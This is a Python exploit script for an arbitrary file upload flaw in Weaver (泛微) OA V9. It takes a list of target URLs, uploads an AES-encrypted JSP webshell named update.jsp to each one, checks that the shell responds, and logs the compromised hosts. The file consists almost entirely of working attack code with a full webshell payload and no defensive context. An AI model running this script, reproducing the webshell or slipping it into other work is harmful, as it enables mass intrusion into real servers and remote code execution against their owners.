import requests
import sys
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mVersion: 泛微OA V9 任意文件上传                                       \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mFile        >>> url.txt                                             \033[0m')
    print('+------------------------------------------')

#随机ua
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua



def POC_1(target_url):
    vuln_url_1 = target_url + "/page/exportImport/uploadOperation.jsp"
    print('\033[36m[+] 正在请求: {}'.format(vuln_url_1))
    headers = {
        "User-Agent": get_ua(),
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc",
        "Connection": "close",
        "Content-Length": "500"
    }
    files = {
        'file': ('update.jsp','<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%><%out.print(666);%>','application/octet-stream')
    }
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    response = requests.post(url=vuln_url_1, headers=headers, timeout=5, files=files, verify=False)
    webshell_url = target_url + "/page/exportImport/fileTransfer/update.jsp"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=webshell_url, timeout=5, verify=False, headers=headers)
        if '666' in response.text and response.status_code == 200:
            with open('webshell.txt', 'a', encoding='utf8') as vu:
                vu.write("目标 {} 被上传木马: {}/page/exportImport/fileTransfer/update.jsp\n".format(target_url, target_url))
                print("\033[32m[+] 目标 {} 被上传木马: {}/page/exportImport/fileTransfer/update.jsp \033[0m".format(target_url, target_url))
    except Exception as e:
        print("\033[31m[x] "+url+" 请求报错 \033[0m".format(e))

def Scan(file_name):
    header={"User-Agent": get_ua(),}
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
                url = url.strip('\n')
            try:
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                httpError = False
                try:
                    req = requests.get(url=url, headers=header, verify=False, timeout=5)
                except Exception as e:
                    httpError = True
                if not httpError and req.status_code == 200:
                    print("\033[32m[+] 正在请求{}".format(url))
                else:
                    url = url.replace("http","https")
                    req = requests.get(url=url, headers=header, verify=False, timeout=5)
                    if req.status_code == 200:
                        print("\033[32m[+] 正在请求{}".format(url))
                    else:
                        pass
            except Exception as e:
                print("\033[31m[x] "+url+" 访问失败 \033[0m".format(e))
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] "+url+" 请求报错 \033[0m".format(e))
                continue
if __name__ == '__main__':
    title()
    file_name  = str(input("\033[35m请输入需要检测的文件名：\033[0m"))
    Scan(file_name)
